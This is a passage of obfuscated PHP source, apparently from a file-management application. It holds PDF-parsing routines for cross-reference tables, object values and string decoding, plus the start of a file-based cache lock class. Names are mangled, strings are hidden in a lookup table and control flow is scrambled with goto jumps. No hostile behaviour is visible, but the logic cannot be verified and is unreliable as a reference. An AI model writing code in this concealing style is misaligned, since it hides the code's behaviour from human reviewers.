âŠå÷[1169]), $eù© âŠå÷[75] => $d…·¢‡ÑÛÒ, $eù© âŠå÷[77] => filesize($d…·¢‡ÑÛÒ), $eù© âŠå÷[1532] => $cÉºâ›ï¸…); goto b¹†ˆ¨À’; D‹î‹‰®æ: $D„ÓææÖ… = $eù© âŠå÷[1537]; preg_match($D„ÓææÖ…, $Dø²¾ªÏê´[$eù© âŠå÷[1533]], $b—ò¬ˆùÜµ); if (!$FÄŠÒ¸†¢æ[$eù© âŠå÷[1536]] && count($b—ò¬ˆùÜµ) == 5) { $FÄŠÒ¸†¢æ[$eù© âŠå÷[1536]] = $b—ò¬ˆùÜµ[3]; $FÄŠÒ¸†¢æ[$eù© âŠå÷[1538]] = $b—ò¬ˆùÜµ[4]; } goto cˆßƒ´ãÉÒ; C‚âóÎîË”: preg_match_all($D„ÓææÖ…, $Dø²¾ªÏê´[$eù© âŠå÷[1533]], $b—ò¬ˆùÜµ); if ($b—ò¬ˆùÜµ[1] && $FÄŠÒ¸†¢æ[$eù© âŠå÷[1540]] < $b—ò¬ˆùÜµ[1][0]) { $FÄŠÒ¸†¢æ[$eù© âŠå÷[1540]] = $b—ò¬ˆùÜµ[1][0]; } preg_match_all($D„ÓææÖ…, $Dø²¾ªÏê´[$eù© âŠå÷[1534]], $b—ò¬ˆùÜµ); goto A¸Ñ¬›•Ê²; A¸Ñ¬›•Ê²: if ($b—ò¬ˆùÜµ[1] && $FÄŠÒ¸†¢æ[$eù© âŠå÷[1540]] < $b—ò¬ˆùÜµ[1][0]) { $FÄŠÒ¸†¢æ[$eù© âŠå÷[1540]] = $b—ò¬ˆùÜµ[1][0]; } $FÄŠÒ¸†¢æ = self::parseInfoItem($FÄŠÒ¸†¢æ); return $FÄŠÒ¸†¢æ; goto eÔù®ğ¡å; b¹†ˆ¨À’: $Dø²¾ªÏê´[$eù© âŠå÷[1533]] = StreamWrapperIO::read($d…·¢‡ÑÛÒ, 0, $cÉºâ›ï¸…); $Dø²¾ªÏê´[$eù© âŠå÷[1534]] = StreamWrapperIO::read($d…·¢‡ÑÛÒ, $Dø²¾ªÏê´[$eù© âŠå÷[77]] - $cÉºâ›ï¸…, $cÉºâ›ï¸…); $B­Š•·È” = self::decodeXref($Dø²¾ªÏê´); goto eç ğª»ó³; cˆßƒ´ãÉÒ: preg_match($D„ÓææÖ…, $Dø²¾ªÏê´[$eù© âŠå÷[1534]], $b—ò¬ˆùÜµ); if (!$FÄŠÒ¸†¢æ[$eù© âŠå÷[1536]] && count($b—ò¬ˆùÜµ) == 5) { $FÄŠÒ¸†¢æ[$eù© âŠå÷[1536]] = $b—ò¬ˆùÜµ[3]; $FÄŠÒ¸†¢æ[$eù© âŠå÷[1538]] = $b—ò¬ˆùÜµ[4]; } preg_match($eù© âŠå÷[1539], $Dø²¾ªÏê´[$eù© âŠå÷[1533]], $b—ò¬ˆùÜµ); goto eØ½´á±Í; eç ğª»ó³: if ($B­Š•·È”) { $cÊíÍÁ–á = $B­Š•·È”[$eù© âŠå÷[1535]][$eù© âŠå÷[1191]]; $FÄŠÒ¸†¢æ = self::getObjectValue($Dø²¾ªÏê´, $B­Š•·È”, $cÊíÍÁ–á); } $FÄŠÒ¸†¢æ = is_array($FÄŠÒ¸†¢æ) ? $FÄŠÒ¸†¢æ : array(); $FÄŠÒ¸†¢æ[$eù© âŠå÷[1536]] = 0; goto D‹î‹‰®æ; eÔù®ğ¡å: } private static function parseInfoItem($aÔ…“ÌÃóÕ) { $F¬äÕ¯ˆˆÑ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$aÔ…“ÌÃóÕ) { return !1; } $Aè©÷Èõç = array($F¬äÕ¯ˆˆÑ[1343] => array($F¬äÕ¯ˆˆÑ[1542], $F¬äÕ¯ˆˆÑ[33]), $F¬äÕ¯ˆˆÑ[1543] => array($F¬äÕ¯ˆˆÑ[1544], $F¬äÕ¯ˆˆÑ[33]), $F¬äÕ¯ˆˆÑ[187] => array($F¬äÕ¯ˆˆÑ[1545], $F¬äÕ¯ˆˆÑ[210]), $F¬äÕ¯ˆˆÑ[107] => array($F¬äÕ¯ˆˆÑ[1546], $F¬äÕ¯ˆˆÑ[210]), $F¬äÕ¯ˆˆÑ[1540] => array($F¬äÕ¯ˆˆÑ[1540], $F¬äÕ¯ˆˆÑ[276]), $F¬äÕ¯ˆˆÑ[1536] => array($F¬äÕ¯ˆˆÑ[1536], $F¬äÕ¯ˆˆÑ[276]), $F¬äÕ¯ˆˆÑ[1538] => array($F¬äÕ¯ˆˆÑ[1538], $F¬äÕ¯ˆˆÑ[276]), $F¬äÕ¯ˆˆÑ[1547] => array($F¬äÕ¯ˆˆÑ[1548], $F¬äÕ¯ˆˆÑ[33]), $F¬äÕ¯ˆˆÑ[1549] => array($F¬äÕ¯ˆˆÑ[1550], $F¬äÕ¯ˆˆÑ[33]), $F¬äÕ¯ˆˆÑ[1551] => array($F¬äÕ¯ˆˆÑ[1342], $F¬äÕ¯ˆˆÑ[33])); $açŞÉÛœ ñ = array(); foreach ($Aè©÷Èõç as $CƒÇ¨©Ã“… => $Då÷ñÃá«ª) { if (!isset($aÔ…“ÌÃóÕ[$Då÷ñÃá«ª[0]])) { continue; } $D”–¯†Ø  = $aÔ…“ÌÃóÕ[$Då÷ñÃá«ª[0]]; if (!$D”–¯†Ø  || is_array($D”–¯†Ø )) { continue; } switch ($Då÷ñÃá«ª[1]) { case $F¬äÕ¯ˆˆÑ[276]: $D”–¯†Ø  = intval($D”–¯†Ø ); break; case $F¬äÕ¯ˆˆÑ[210]: if (substr($D”–¯†Ø , 0, 2) == $F¬äÕ¯ˆˆÑ[1552]) { $D”–¯†Ø  = substr($D”–¯†Ø , 2, 14); } if (strtotime($D”–¯†Ø )) { $D”–¯†Ø  = date($F¬äÕ¯ˆˆÑ[1553], strtotime($D”–¯†Ø )); } break; } $açŞÉÛœ ñ[$CƒÇ¨©Ã“…] = $D”–¯†Ø ; } return $açŞÉÛœ ñ; } private static function decodeXref(&$bäÆä…ßº‚) { goto F Úßõ‡”ì; a–ä¾ŞãôŒ: $f–ˆí¯ãÈ = $dù‘å‚ãÙ[1555]; if (!preg_match_all($f–ˆí¯ãÈ, $c×‡Ö°¹±„, $FéƒÅÏ“¢, PREG_SET_ORDER, 0)) { return !1; } $C¬ë¦ñØÑÁ = intval($FéƒÅÏ“¢[0][1]); goto a¡³”˜…¼; d”ïç…ÓÃÛ: if (preg_match($dù‘å‚ãÙ[1561], $EÄê‰«­¢, $FéƒÅÏ“¢) > 0) { $Cô—ÈÒ ¢[$dù‘å‚ãÙ[1535]][$dù‘å‚ãÙ[77]] = intval($FéƒÅÏ“¢[1]); } if (preg_match($dù‘å‚ãÙ[1562], $EÄê‰«­¢, $FéƒÅÏ“¢) > 0) { $Cô—ÈÒ ¢[$dù‘å‚ãÙ[1535]][$dù‘å‚ãÙ[1563]] = intval($FéƒÅÏ“¢[1]) . $dù‘å‚ãÙ[70] . intval($FéƒÅÏ“¢[2]); } if (preg_match($dù‘å‚ãÙ[1564], $EÄê‰«­¢, $FéƒÅÏ“¢) > 0) { $Cô—ÈÒ ¢[$dù‘å‚ãÙ[1535]][$dù‘å‚ãÙ[1565]] = intval($FéƒÅÏ“¢[1]) . $dù‘å‚ãÙ[70] . intval($FéƒÅÏ“¢[2]); } goto eíÄÕ¬ÃĞ“; eíÄÕ¬ÃĞ“: if (preg_match($dù‘å‚ãÙ[1566], $EÄê‰«­¢, $FéƒÅÏ“¢) > 0) { $Cô—ÈÒ ¢[$dù‘å‚ãÙ[1535]][$dù‘å‚ãÙ[1191]] = intval($FéƒÅÏ“¢[1]) . $dù‘å‚ãÙ[70] . intval($FéƒÅÏ“¢[2]); } if (preg_match($dù‘å‚ãÙ[1567], $EÄê‰«­¢, $FéƒÅÏ“¢) > 0) { $Cô—ÈÒ ¢[$dù‘å‚ãÙ[1535]][$dù‘å‚ãÙ[367]] = array(); $Cô—ÈÒ ¢[$dù‘å‚ãÙ[1535]][$dù‘å‚ãÙ[367]][0] = $FéƒÅÏ“¢[1]; $Cô—ÈÒ ¢[$dù‘å‚ãÙ[1535]][$dù‘å‚ãÙ[367]][1] = $FéƒÅÏ“¢[2]; } if (!$Cô—ÈÒ ¢[$dù‘å‚ãÙ[1535]][$dù‘å‚ãÙ[1191]]) { return !1; } goto d½¯ƒöØğ…; d½¯ƒöØğ…: if (preg_match($dù‘å‚ãÙ[1568], $EÄê‰«­¢, $FéƒÅÏ“¢) > 0) { } return $Cô—ÈÒ ¢; goto bò¿ÇÆ¤÷ò; a¡³”˜…¼: if ($bäÆä…ßº‚[$dù‘å‚ãÙ[77]] - $C¬ë¦ñØÑÁ > $bäÆä…ßº‚[$dù‘å‚ãÙ[1532]]) { $f¿ãÛ¤æŠŠ = 4 * $bäÆä…ßº‚[$dù‘å‚ãÙ[1532]]; $bäÆä…ßº‚[$dù‘å‚ãÙ[1532]] = $f¿ãÛ¤æŠŠ; $bäÆä…ßº‚[$dù‘å‚ãÙ[1533]] = StreamWrapperIO::read($bäÆä…ßº‚[$dù‘å‚ãÙ[75]], 0, $f¿ãÛ¤æŠŠ); $bäÆä…ßº‚[$dù‘å‚ãÙ[1534]] = StreamWrapperIO::read($bäÆä…ßº‚[$dù‘å‚ãÙ[75]], $bäÆä…ßº‚[$dù‘å‚ãÙ[77]] - $f¿ãÛ¤æŠŠ, $f¿ãÛ¤æŠŠ); $c×‡Ö°¹±„ = $bäÆä…ßº‚[$dù‘å‚ãÙ[1534]]; } $EÜõçÜÆÀœ = 0; preg_match_all($dù‘å‚ãÙ[1556], $c×‡Ö°¹±„, $FéƒÅÏ“¢); goto AõŠ§±Òö; F Úßõ‡”ì: $dù‘å‚ãÙ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c×‡Ö°¹±„ = $bäÆä…ßº‚[$dù‘å‚ãÙ[1534]]; $Cô—ÈÒ ¢ = array($dù‘å‚ãÙ[1535] => array(), $dù‘å‚ãÙ[1554] => array()); goto a–ä¾ŞãôŒ; AõŠ§±Òö: foreach ($FéƒÅÏ“¢[3] as $BØÄéœ¿‘¢ => $b’ğøƒÆ¸¸) { if ($FéƒÅÏ“¢[3][$BØÄéœ¿‘¢] == $dù‘å‚ãÙ[1557]) { $b‘µ‰ËôÊĞ = $EÜõçÜÆÀœ . $dù‘å‚ãÙ[70] . intval($FéƒÅÏ“¢[2][$BØÄéœ¿‘¢]); $Cô—ÈÒ ¢[$dù‘å‚ãÙ[1554]][$b‘µ‰ËôÊĞ] = intval($FéƒÅÏ“¢[1][$BØÄéœ¿‘¢]); ++$EÜõçÜÆÀœ; } else { if ($FéƒÅÏ“¢[3][$BØÄéœ¿‘¢] == $dù‘å‚ãÙ[1558]) { ++$EÜõçÜÆÀœ; } else { } } } if (preg_match_all($dù‘å‚ãÙ[1559], $c×‡Ö°¹±„, $FéƒÅÏ“¢)) { $Aî¡°Æº¼ï = $bäÆä…ßº‚[$dù‘å‚ãÙ[77]] - $bäÆä…ßº‚[$dù‘å‚ãÙ[1532]]; foreach ($FéƒÅÏ“¢[0] as $BØÄéœ¿‘¢ => $aÛÉ®â˜´) { $b¹ëĞÕ»™ = $FéƒÅÏ“¢[1][$BØÄéœ¿‘¢] . $dù‘å‚ãÙ[70] . $FéƒÅÏ“¢[2][$BØÄéœ¿‘¢]; $Cô—ÈÒ ¢[$dù‘å‚ãÙ[1554]][$b¹ëĞÕ»™] = strpos($c×‡Ö°¹±„, $aÛÉ®â˜´) + $Aî¡°Æº¼ï + 1; } } if (preg_match_all($dù‘å‚ãÙ[1560], $c×‡Ö°¹±„, $FéƒÅÏ“¢)) { $EÄê‰«­¢ = count($FéƒÅÏ“¢[1]) == 1 ? $FéƒÅÏ“¢[1][0] : $FéƒÅÏ“¢[1][1]; } else { $EÄê‰«­¢ = substr($c×‡Ö°¹±„, -1024 * 5); } goto d”ïç…ÓÃÛ; bò¿ÇÆ¤÷ò: } private static function getObjectValue($Fƒ·ö±ó›, $CŒÛ´‚”èŠ, $fŠ½ØŸ«¼ƒ) { goto A®Â´ŠÃ‰à; eî×ö®ä²‘: if (!is_array($dåçâ¤ì¬â[1])) { return array(); } $AõÔğÏñÂÑ = array(); for ($Dïµ­Á‰³º = 0; $Dïµ­Á‰³º < count($dåçâ¤ì¬â[1]); $Dïµ­Á‰³º += 2) { $c¿ñ„µÈê… = $dåçâ¤ì¬â[1][$Dïµ­Á‰³º]; $Aìš‚š«ŠÛ = $dåçâ¤ì¬â[1][$Dïµ­Á‰³º + 1]; if (count($c¿ñ„µÈê…) == 3 && $c¿ñ„µÈê…[0] == $E‹£öùáé×[8]) { $fÇÉ§†£ô£ = !1; if ($Aìš‚š«ŠÛ[0] == $E‹£öùáé×[1569]) { $Aìš‚š«ŠÛ = self::getObject($Fƒ·ö±ó›, $CŒÛ´‚”èŠ[$E‹£öùáé×[1554]][$Aìš‚š«ŠÛ[1]]); } $fÇÉ§†£ô£ = $Aìš‚š«ŠÛ[1]; if ($fÇÉ§†£ô£ === !1) { continue; } if (is_string($fÇÉ§†£ô£)) { $fÇÉ§†£ô£ = self::decodeStr($fÇÉ§†£ô£); } $AõÔğÏñÂÑ[$c¿ñ„µÈê…[1]] = $fÇÉ§†£ô£; } } goto DÔÛÌ†; DÔÛÌ†: return $AõÔğÏñÂÑ; goto fŸÊéá›²Ú; A®Â´ŠÃ‰à: $E‹£öùáé× =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dåçâ¤ì¬â = self::getObject($Fƒ·ö±ó›, $CŒÛ´‚”èŠ[$E‹£öùáé×[1554]][$fŠ½ØŸ«¼ƒ]); if (is_string($dåçâ¤ì¬â[1])) { return $dåçâ¤ì¬â[1]; } goto eî×ö®ä²‘; fŸÊéá›²Ú: } private static function getObject($D¹Æ¿Ï‡â, $F¬İÜ­) { $cİ…„ç¡Ü = self::getObjectItem($D¹Æ¿Ï‡â, $F¬İÜ­); $cİ…„ç¡Ü = self::getObjectItem($D¹Æ¿Ï‡â, $cİ…„ç¡Ü[2]); return $cİ…„ç¡Ü; } private static function getObjectItem($fÓ…£¸Ö, $F—»“½ä«) { goto b—Ç‡§Š÷; CŞ´ºº±Ï: $d×ÌÀÎ‡ = $F—»“½ä« >= $eÇ†ÏÑ½ä¹ ? $F—»“½ä« - $eÇ†ÏÑ½ä¹ : $F—»“½ä«; $E‰¾Û÷£¦ = $F—»“½ä« >= $eÇ†ÏÑ½ä¹ ? $fÓ…£¸Ö[$bˆ©ì×·œŞ[1534]] : $fÓ…£¸Ö[$bˆ©ì×·œŞ[1533]]; if ($F—»“½ä« > $cÌÙ–Ã˜ç && $F—»“½ä« <= $eÇ†ÏÑ½ä¹) { $d×ÌÀÎ‡ = 0; $E‰¾Û÷£¦ = StreamWrapperIO::read($fÓ…£¸Ö[$bˆ©ì×·œŞ[75]], $F—»“½ä«, $cÌÙ–Ã˜ç); } goto Cí²ÂÁìéÍ; Cí²ÂÁìéÍ: $f¨‰‘ÂŠŞ = self::getRawObject($E‰¾Û÷£¦, $d×ÌÀÎ‡); if ($F—»“½ä« >= $eÇ†ÏÑ½ä¹) { $f¨‰‘ÂŠŞ[2] = $f¨‰‘ÂŠŞ[2] + $eÇ†ÏÑ½ä¹; } else { if ($F—»“½ä« > $cÌÙ–Ã˜ç && $F—»“½ä« <= $eÇ†ÏÑ½ä¹) { $f¨‰‘ÂŠŞ[2] = $f¨‰‘ÂŠŞ[2] + $F—»“½ä«; } } return $f¨‰‘ÂŠŞ; goto CÖ£Ë°ïŒ¨; b—Ç‡§Š÷: $bˆ©ì×·œŞ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cÌÙ–Ã˜ç = $fÓ…£¸Ö[$bˆ©ì×·œŞ[1532]]; $eÇ†ÏÑ½ä¹ = $fÓ…£¸Ö[$bˆ©ì×·œŞ[77]] - $cÌÙ–Ã˜ç; goto CŞ´ºº±Ï; CÖ£Ë°ïŒ¨: } private static function decodeStr($f¿ÁÆ‹¼‹ò) { goto Fëœêóà; aŒ„¡‡ˆ: $f¿ÁÆ‹¼‹ò = $B”¸Å¹®ï[33]; foreach ($bºÜ†’Äô— as $f™ÃğŸ‚¤) { if (preg_match($B”¸Å¹®ï[1584], $f™ÃğŸ‚¤) && !1 === stripos($f™ÃğŸ‚¤, $B”¸Å¹®ï[1585])) { $f™ÃğŸ‚¤ = preg_replace($B”¸Å¹®ï[1586], $B”¸Å¹®ï[33], $f™ÃğŸ‚¤); $f™ÃğŸ‚¤ = trim($f™ÃğŸ‚¤, $B”¸Å¹®ï[922]); $f™ÃğŸ‚¤ = pack($B”¸Å¹®ï[1587], $f™ÃğŸ‚¤); $f¿ÁÆ‹¼‹ò .= $f™ÃğŸ‚¤; } else { $f¿ÁÆ‹¼‹ò .= $f™ÃğŸ‚¤; } } if (preg_match($B”¸Å¹®ï[1588], $f¿ÁÆ‹¼‹ò)) { $D–™¼‰•£Â = substr($f¿ÁÆ‹¼‹ò, 2); $f¿ÁÆ‹¼‹ò = $B”¸Å¹®ï[33]; $aë…°ëÄÄó = strlen($D–™¼‰•£Â); for ($FÜ‹É‡££í = 0; $FÜ‹É‡££í < $aë…°ëÄÄó; $FÜ‹É‡££í += 2) { $EÔ¶ÉÔÅ“ö = hexdec(bin2hex(substr($D–™¼‰•£Â, $FÜ‹É‡££í, 2))); $f¿ÁÆ‹¼‹ò .= mb_convert_encoding($B”¸Å¹®ï[1589] . intval($EÔ¶ÉÔÅ“ö) . $B”¸Å¹®ï[67], $B”¸Å¹®ï[1590], $B”¸Å¹®ï[1591]); } } goto D‘‚Ò§ˆ‡È; B‚ãÁÎ˜—›: $f¿ÁÆ‹¼‹ò = $B”¸Å¹®ï[33]; foreach ($bºÜ†’Äô— as $f™ÃğŸ‚¤) { if (preg_match($B”¸Å¹®ï[1581], $f™ÃğŸ‚¤)) { $f¿ÁÆ‹¼‹ò .= \chr(hexdec(trim($f™ÃğŸ‚¤, $B”¸Å¹®ï[1582]))); } else { $f¿ÁÆ‹¼‹ò .= $f™ÃğŸ‚¤; } } $bºÜ†’Äô— = preg_split($B”¸Å¹®ï[1583], $f¿ÁÆ‹¼‹ò, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto aŒ„¡‡ˆ; D‘‚Ò§ˆ‡È: return $f¿ÁÆ‹¼‹ò; goto b×Ó´ÕÉÖœ; Fëœêóà: $B”¸Å¹®ï =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f¿ÁÆ‹¼‹ò = str_replace(array($B”¸Å¹®ï[1570], $B”¸Å¹®ï[1571], $B”¸Å¹®ï[1572], $B”¸Å¹®ï[1573], $B”¸Å¹®ï[1574], $B”¸Å¹®ï[1575], $B”¸Å¹®ï[1576], $B”¸Å¹®ï[1577]), array($B”¸Å¹®ï[93], $B”¸Å¹®ï[50], $B”¸Å¹®ï[8], $B”¸Å¹®ï[248], $B”¸Å¹®ï[813], $B”¸Å¹®ï[217], $B”¸Å¹®ï[989], $B”¸Å¹®ï[330]), $f¿ÁÆ‹¼‹ò); $bºÜ†’Äô— = preg_split($B”¸Å¹®ï[1578], $f¿ÁÆ‹¼‹ò, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto b‰é”ÙöÊŞ; b‰é”ÙöÊŞ: $f¿ÁÆ‹¼‹ò = $B”¸Å¹®ï[33]; foreach ($bºÜ†’Äô— as $f™ÃğŸ‚¤) { if (preg_match($B”¸Å¹®ï[1579], $f™ÃğŸ‚¤)) { $f¿ÁÆ‹¼‹ò .= \chr(octdec(trim($f™ÃğŸ‚¤, $B”¸Å¹®ï[93]))); } else { $f¿ÁÆ‹¼‹ò .= $f™ÃğŸ‚¤; } } $bºÜ†’Äô— = preg_split($B”¸Å¹®ï[1580], $f¿ÁÆ‹¼‹ò, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto B‚ãÁÎ˜—›; b×Ó´ÕÉÖœ: } private static function getRawObject($b¿œ·¶åàî, $b˜ğœĞñ¿ = 0) { goto A¼…¼”Åß«; e¿¿†ÕÙ—Ş: return array($Bİ‘»â˜£Ÿ, $C†Ì“º‰˜Ñ, $b˜ğœĞñ¿); goto a¹¼ÊÜ¿î»; aƒÕÚ¯èË: $b˜ğœĞñ¿ += strspn($b¿œ·¶åàî, $B³…à ŒÓ„[1592], $b˜ğœĞñ¿); $c†İî‘ÖØ£ = $b¿œ·¶åàî[$b˜ğœĞñ¿]; switch ($c†İî‘ÖØ£) { case $B³…à ŒÓ„[1593]: $cê¦«Š¥ƒâ = strcspn($b¿œ·¶åàî, $B³…à ŒÓ„[1594], $b˜ğœĞñ¿); if ($cê¦«Š¥ƒâ > 0) { $b˜ğœĞñ¿ += $cê¦«Š¥ƒâ; return self::getRawObject($b¿œ·¶åàî, $b˜ğœĞñ¿); } break; case $B³…à ŒÓ„[8]: $Bİ‘»â˜£Ÿ = $c†İî‘ÖØ£; ++$b˜ğœĞñ¿; $CĞ­ŒÓáĞ = preg_match($B³…à ŒÓ„[1595], substr($b¿œ·¶åàî, $b˜ğœĞñ¿, 256), $D×¼®‰Œğ); if (1 == $CĞ­ŒÓáĞ) { $C†Ì“º‰˜Ñ = $D×¼®‰Œğ[1]; $b˜ğœĞñ¿ += strlen($C†Ì“º‰˜Ñ); } break; case $B³…à ŒÓ„[248]: case $B³…à ŒÓ„[813]: $Bİ‘»â˜£Ÿ = $c†İî‘ÖØ£; ++$b˜ğœĞñ¿; $a°ÈèÒÙ¤– = $b˜ğœĞñ¿; if ($B³…à ŒÓ„[248] == $c†İî‘ÖØ£) { $DßÔ³´±Ñç = 1; while ($DßÔ³´±Ñç > 0) { if (!isset($b¿œ·¶åàî[$a°ÈèÒÙ¤–])) { break; } $DĞœ¬ø¸±” = $b¿œ·¶åàî[$a°ÈèÒÙ¤–]; switch ($DĞœ¬ø¸±”) { case $B³…à ŒÓ„[93]: ++$a°ÈèÒÙ¤–; break; case $B³…à ŒÓ„[248]: ++$DßÔ³´±Ñç; break; case $B³…à ŒÓ„[813]: --$DßÔ³´±Ñç; break; } ++$a°ÈèÒÙ¤–; } $C†Ì“º‰˜Ñ = substr($b¿œ·¶åàî, $b˜ğœĞñ¿, $a°ÈèÒÙ¤– - $b˜ğœĞñ¿ - 1); $b˜ğœĞñ¿ = $a°ÈèÒÙ¤–; } break; case $B³…à ŒÓ„[157]: case $B³…à ŒÓ„[478]: $Bİ‘»â˜£Ÿ = $c†İî‘ÖØ£; ++$b˜ğœĞñ¿; if ($B³…à ŒÓ„[157] == $c†İî‘ÖØ£) { $C†Ì“º‰˜Ñ = array(); do { $E¹˜ª’ÇÌ = $b˜ğœĞñ¿; $dÏâÃÌ‰Š¨ = self::getRawObject($b¿œ·¶åàî, $b˜ğœĞñ¿); $b˜ğœĞñ¿ = $dÏâÃÌ‰Š¨[2]; $C†Ì“º‰˜Ñ[] = $dÏâÃÌ‰Š¨; } while ($B³…à ŒÓ„[478] != $dÏâÃÌ‰Š¨[0] && $b˜ğœĞñ¿ != $E¹˜ª’ÇÌ); array_pop($C†Ì“º‰˜Ñ); } break; case $B³…à ŒÓ„[921]: case $B³…à ŒÓ„[924]: if (isset($b¿œ·¶åàî[$b˜ğœĞñ¿ + 1]) && $b¿œ·¶åàî[$b˜ğœĞñ¿ + 1] == $c†İî‘ÖØ£) { $Bİ‘»â˜£Ÿ = $c†İî‘ÖØ£ . $c†İî‘ÖØ£; $b˜ğœĞñ¿ += 2; if ($B³…à ŒÓ„[921] == $c†İî‘ÖØ£) { $C†Ì“º‰˜Ñ = array(); do { $E¹˜ª’ÇÌ = $b˜ğœĞñ¿; $dÏâÃÌ‰Š¨ = self::getRawObject($b¿œ·¶åàî, $b˜ğœĞñ¿); $b˜ğœĞñ¿ = $dÏâÃÌ‰Š¨[2]; $C†Ì“º‰˜Ñ[] = $dÏâÃÌ‰Š¨; } while ($B³…à ŒÓ„[1596] != $dÏâÃÌ‰Š¨[0] && $b˜ğœĞñ¿ != $E¹˜ª’ÇÌ); array_pop($C†Ì“º‰˜Ñ); } } else { $Bİ‘»â˜£Ÿ = $c†İî‘ÖØ£; ++$b˜ğœĞñ¿; $CĞ­ŒÓáĞ = preg_match($B³…à ŒÓ„[1597], substr($b¿œ·¶åàî, $b˜ğœĞñ¿), $D×¼®‰Œğ); if ($B³…à ŒÓ„[921] == $c†İî‘ÖØ£ && 1 == $CĞ­ŒÓáĞ) { $C†Ì“º‰˜Ñ = strtr($D×¼®‰Œğ[1], $B³…à ŒÓ„[1598], $B³…à ŒÓ„[33]); $b˜ğœĞñ¿ += \strlen($D×¼®‰Œğ[0]); } elseif (!1 !== ($CÁµ¼ÛÁ¬“ = strpos($b¿œ·¶åàî, $B³…à ŒÓ„[924], $b˜ğœĞñ¿))) { $b˜ğœĞñ¿ = $CÁµ¼ÛÁ¬“ + 1; } } break; default: if ($B³…à ŒÓ„[1599] == substr($b¿œ·¶åàî, $b˜ğœĞñ¿, 6)) { $Bİ‘»â˜£Ÿ = $B³…à ŒÓ„[1599]; $b˜ğœĞñ¿ += 6; } elseif ($B³…à ŒÓ„[99] == substr($b¿œ·¶åàî, $b˜ğœĞñ¿, 4)) { $Bİ‘»â˜£Ÿ = $B³…à ŒÓ„[99]; $b˜ğœĞñ¿ += 4; $C†Ì“º‰˜Ñ = $B³…à ŒÓ„[99]; } elseif ($B³…à ŒÓ„[1600] == substr($b¿œ·¶åàî, $b˜ğœĞñ¿, 4)) { $Bİ‘»â˜£Ÿ = $B³…à ŒÓ„[1601]; $b˜ğœĞñ¿ += 4; $C†Ì“º‰˜Ñ = $B³…à ŒÓ„[1600]; } elseif ($B³…à ŒÓ„[1602] == substr($b¿œ·¶åàî, $b˜ğœĞñ¿, 5)) { $Bİ‘»â˜£Ÿ = $B³…à ŒÓ„[1601]; $b˜ğœĞñ¿ += 5; $C†Ì“º‰˜Ñ = $B³…à ŒÓ„[1602]; } elseif ($B³…à ŒÓ„[1603] == substr($b¿œ·¶åàî, $b˜ğœĞñ¿, 6)) { $Bİ‘»â˜£Ÿ = $B³…à ŒÓ„[1603]; $b˜ğœĞñ¿ += 6; if (1 == preg_match($B³…à ŒÓ„[1604], substr($b¿œ·¶åàî, $b˜ğœĞñ¿), $D×¼®‰Œğ)) { $b˜ğœĞñ¿ += strlen($D×¼®‰Œğ[0]); $aŠ•ê¿µ§ = $B³…à ŒÓ„[1605]; $CĞ­ŒÓáĞ = preg_match($aŠ•ê¿µ§, substr($b¿œ·¶åàî, $b˜ğœĞñ¿), $D×¼®‰Œğ, PREG_OFFSET_CAPTURE); if (1 == $CĞ­ŒÓáĞ) { $C†Ì“º‰˜Ñ = substr($b¿œ·¶åàî, $b˜ğœĞñ¿, $D×¼®‰Œğ[0][1]); $b˜ğœĞñ¿ += $D×¼®‰Œğ[1][1]; } } } elseif ($B³…à ŒÓ„[1606] == substr($b¿œ·¶åàî, $b˜ğœĞñ¿, 9)) { $Bİ‘»â˜£Ÿ = $B³…à ŒÓ„[1606]; $b˜ğœĞñ¿ += 9; } elseif (1 == preg_match($B³…à ŒÓ„[1607], substr($b¿œ·¶åàî, $b˜ğœĞñ¿, 33), $D×¼®‰Œğ)) { $Bİ‘»â˜£Ÿ = $B³…à ŒÓ„[1569]; $b˜ğœĞñ¿ += strlen($D×¼®‰Œğ[0]); $C†Ì“º‰˜Ñ = intval($D×¼®‰Œğ[1]) . $B³…à ŒÓ„[70] . intval($D×¼®‰Œğ[2]); } elseif (1 == preg_match($B³…à ŒÓ„[1608], substr($b¿œ·¶åàî, $b˜ğœĞñ¿, 33), $D×¼®‰Œğ)) { $Bİ‘»â˜£Ÿ = $B³…à ŒÓ„[1609]; $C†Ì“º‰˜Ñ = intval($D×¼®‰Œğ[1]) . $B³…à ŒÓ„[70] . intval($D×¼®‰Œğ[2]); $b˜ğœĞñ¿ += strlen($D×¼®‰Œğ[0]); } elseif (($F¤ò„âÆß¬ = strspn($b¿œ·¶åàî, $B³…à ŒÓ„[1610], $b˜ğœĞñ¿)) > 0) { $Bİ‘»â˜£Ÿ = $B³…à ŒÓ„[1611]; $C†Ì“º‰˜Ñ = substr($b¿œ·¶åàî, $b˜ğœĞñ¿, $F¤ò„âÆß¬); $b˜ğœĞñ¿ += $F¤ò„âÆß¬; } break; } goto e¿¿†ÕÙ—Ş; A¼…¼”Åß«: $B³…à ŒÓ„ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Bİ‘»â˜£Ÿ = $B³…à ŒÓ„[33]; $C†Ì“º‰˜Ñ = $B³…à ŒÓ„[33]; goto aƒÕÚ¯èË; a¹¼ÊÜ¿î»: } } goto D÷â®§–ƒë; a¡÷¡ª†íÄ: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $e„‚™÷¾¬é =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d·ìºæ•òô = $GLOBALS[$e„‚™÷¾¬é[6]][$e„‚™÷¾¬é[337]]; self::$cachePath = $d·ìºæ•òô[$e„‚™÷¾¬é[167]][$e„‚™÷¾¬é[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($e×ÓÖ©ô³, $Fñ‚å¾¶±Î = 0) { goto EŒºŸøÅÈò; F°ë±İö…ë: $this->unlock($e×ÓÖ©ô³); return !1; goto a›èÎó¿‘ø; F…« ³ƒõ: $FÌàã¢ĞĞ‘ = rtrim(self::$cachePath, $fâíÓ£Ñö[8]) . $fâíÓ£Ñö[775] . md5($e×ÓÖ©ô³) . $fâíÓ£Ñö[776]; if 